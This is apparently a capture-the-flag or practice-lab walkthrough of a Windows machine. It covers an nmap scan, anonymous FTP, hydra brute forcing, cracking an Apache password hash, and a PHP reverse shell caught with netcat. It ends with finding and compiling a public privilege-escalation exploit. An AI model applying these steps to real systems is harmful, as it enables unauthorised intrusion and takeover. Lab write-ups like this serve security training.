## NMAP TCP

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-03 14:54 UTC
Nmap scan report for 192.168.51.46
Host is up (0.0010s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Mar 03 22:16 log
| ----------   1 root     root         2275 Aug 09  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Jan 23  2023 accounts
242/tcp  open  http               Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
|_http-title: 401 Authorization Required
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
3145/tcp open  zftp-admin         zFTPServer admin
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2024-03-03T14:56:29+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
```

## FTP

anonymous login on FTP succeeded
In the working directory - there is an accounts folder with following usernames:
```
total 4
dr-xr-xr-x   1 root     root          512 Jan 23  2023 backup
----------   1 root     root          764 Jan 23  2023 acc[Offsec].uac
----------   1 root     root         1030 Mar 03 21:45 acc[anonymous].uac
----------   1 root     root          926 Jan 23  2023 acc[admin].uac
226 Closing data connection.
```

Made users list to brute force ftp using hydra for the same

```hydra-ftp
hydra -L <USERLIST> -P <WORDLIST> ftp://<TARGET> -V
```

Found a .htpasswd file with hash

```
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

Used [hashcat-reference-list](https://hashcat.net/wiki/doku.php?id=example_hashes) to identify hashcat mode 1600 for Apache MD5 hash type

```hashcat-apache-apr1
hashcat -m 1600 <HASHES.TXT> <WORDLIST.TXT>
```

```john-wordlist
john --wordlist=<WORDLIST.TXT> <HASHES.TXT>
```

Found password:

```
elite
```

## PORT 242

Prompted to login - used Offsec:elite
Logged in to page with Qui e nuce nuculeum esse volt, frangit nucem!

This is index.php from FTP as admin:admin
Made PHP reverse shell and uploaded by FTP put command

SHELL:

```
?$ nc -lvnp 9002
listening on [any] 9002 ...
connect to [192.168.49.51] from (UNKNOWN) [192.168.51.46] 49158
SOCKET: Shell has connected! PID: 724
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\wamp\bin\apache\Apache2.2.21>whoami 
livda\apache
```

Found flag for local.txt on Desktop of apache user:

```
C:\Users\apache\Desktop>type local.txt
d5677890a7b398c1bf75a323043caada
```

Found there's a user test123 on system

Upload WINPEAS.BAT via same FTP and then run it

Used systeminfo and [WES-NG](https://github.com/bitsadmin/wesng) :

on target
```
systeminfo
```

on host
```wes-ng
git clone https://github.com/bitsadmin/wesng --depth 1
python wes.py --update
python wes.py systeminfo.txt
```

Suggested many, did some grep for priv esc ones only

```
python wes.py ../systeminfo.txt | grep Elevation -B 7 | grep CVE | cut -d: -f2 | tr -d " " > cves.txt
```

Then searchsploit on this list of CVES

```
cat cves.txt | while read line; do searchsploit --cve $line -w; done | grep https
```

Found exploit 40564

```
searchsploit -m 40564
i686-w64-mingw32-gcc 40564.c -o privilege.exe -lws2_32
```

Uploaded compiled exe via FTP again
executed privilege.exe on remote

==DONE==

